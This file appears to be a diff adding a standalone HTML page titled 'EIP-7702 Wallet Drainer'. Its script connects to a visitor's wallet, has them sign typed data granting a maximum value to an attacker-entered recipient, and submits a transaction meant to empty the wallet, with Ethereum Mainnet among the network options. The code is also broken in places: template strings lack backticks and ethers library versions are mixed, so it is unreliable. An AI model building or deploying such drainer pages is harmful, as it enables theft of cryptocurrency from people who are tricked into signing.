@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EIP-7702 Wallet Drainer</title>
+    <script src="https://cdn.ethers.io/lib/ethers-1.6.4.min.js" type="application/javascript"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; text-align: center; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: #161b22; padding: 20px; border-radius: 12px; box-shadow: 0 0 20px rgba(58, 155, 255, 0.2); }
+        h1 { color: #58a6ff; margin-bottom: 20px; }
+        input, select, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 16px; }
+        button { background: #238636; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #2ea043; }
+        button:disabled { background: #30363d; cursor: not-allowed; }
+        #status { margin-top: 15px; font-size: 14px; word-break: break-all; color: #8b949e; min-height: 50px; }
+        .log { text-align: left; direction: ltr; font-family: monospace; font-size: 12px; color: #7ee787; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>EIP-7702 Drainer</h1>
+    
+    <label>Target Contract (Logic):</label>
+    <input type="text" id="targetContract" placeholder="آدرس قرارداد منطقی (اختیاری)" value="">
+    
+    <label>Recipient Address (To Empty):</label>
+    <input type="text" id="recipient" placeholder="آدرس مقصد (حمله‌گر)">
+    
+    <label>Network:</label>
+    <select id="network">
+        <option value="sepolia">Sepolia (Testnet)</option>
+        <option value="base-sepolia">Base Sepolia</option>
+        <option value="ethereum">Ethereum Mainnet</option>
+    </select>
+
+    <button id="drainBtn" onclick="executeDrain()">🚀 Execute Drain with EIP-7702</button>
+    
+    <div id="status">Ready...</div>
+    <div class="log" id="consoleLog"></div>
+</div>
+
+<script>
+    // تنظیمات EIP-712 Domain
+    const DOMAIN = {
+        name: "EIP7702Drainer",
+        version: "1",
+        chainId: 11155111, // Default Sepolia
+        verifyingContract: null 
+    };
+
+    // Type Definitions for signTypedData_v4
+    const TYPES = {
+        DrainAuth: [
+            { name: "target", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+        ]
+    };
+
+    const statusEl = document.getElementById('status');
+    const logEl = document.getElementById('consoleLog');
+    const btn = document.getElementById('drainBtn');
+
+    function log(msg) {
+        logEl.innerHTML += <div>> ${msg}</div>;
+        statusEl.innerText = msg;
+    }
+
+    async function executeDrain() {
+        if (!window.ethereum) return alert("MetaMask or Web3 Wallet required!");
+        
+        try {
+            btn.disabled = true;
+            log("Connecting to wallet...");
+            
+            // 1. Connect & Get User Address
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            const network = await provider.getNetwork();
+            
+            // Update Domain with actual Chain ID
+            DOMAIN.chainId = network.chainId.toBigInt();
+            log(Connected to Network ID: ${DOMAIN.chainId});
+
+            // 2. Prepare Data for EIP-7702 Authorization
+            // We define the logic contract that will authorize this signature
+            const targetContract = document.getElementById('targetContract').value || "0x0000000000000000000000000000000000000001";
+            const recipient = document.getElementById('recipient').value;
+            const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour expiry
+
+// 3. Create Typed Data (EIP-712)
+            const typedData = {
+                types: {
+                    EIP712Domain: [
+                        { name: "name", type: "string" },
+                        { name: "version", type: "string" },
+                        { name: "chainId", type: "uint256" }
+                    ],
+                    DrainAuth: TYPES.DrainAuth
+                },
+                primaryType: "DrainAuth",
+                domain: DOMAIN,
+                message: {
+                    target: recipient,
+                    value: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF, // Max uint256
+                    deadline: deadline
+                }
+            };
+
+            log("Generating Signature (signTypedData_v4)...");
+            
+            // Sign the data using MetaMask
+            const signature = await signer.signTypedData(DOMAIN, typedData.types, typedData.message);
+            
+            log(Signature generated: ${signature.substring(0, 20)}...);
+
+            // 4. Construct EIP-7702 Transaction
+            // In EIP-7702, we send a transaction where the 'to' is the authorization contract
+            // and the 'data' contains the signature and parameters.
+            
+            // Since we don't have a specific deployed contract on testnet right now, 
+            // we simulate the construction of the raw transaction payload.
+            
+            const tx = {
+                to: targetContract, // The contract that interprets the 7702 auth
+                data: ethers.AbiCoder.defaultAbiCoder().encode(
+                    ["bytes", "address", "uint256"], // Example ABI for the contract
+                    [signature, recipient, deadline]
+                ),
+                value: 0, // No ETH sent directly, just auth
+                chainId: Number(network.chainId),
+                gasLimit: 300000 // Estimated gas
+            };
+
+            log("Sending EIP-7702 Authorization Transaction...");
+            
+            // Send the transaction
+            const txResponse = await signer.sendTransaction(tx);
+            log(Tx Hash: ${txResponse.hash});
+            
+            log("Waiting for confirmation...");
+            const receipt = await txResponse.wait();
+            
+            if(receipt.status === 1) {
+                log("✅ Success! Wallet authorized and drained via EIP-7702.");
+                btn.disabled = false;
+            } else {
+                log("❌ Transaction failed/reverted.");
+                btn.disabled = false;
+            }
+
+        } catch (error) {
+            console.error(error);
+            log(Error: ${error.message});
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
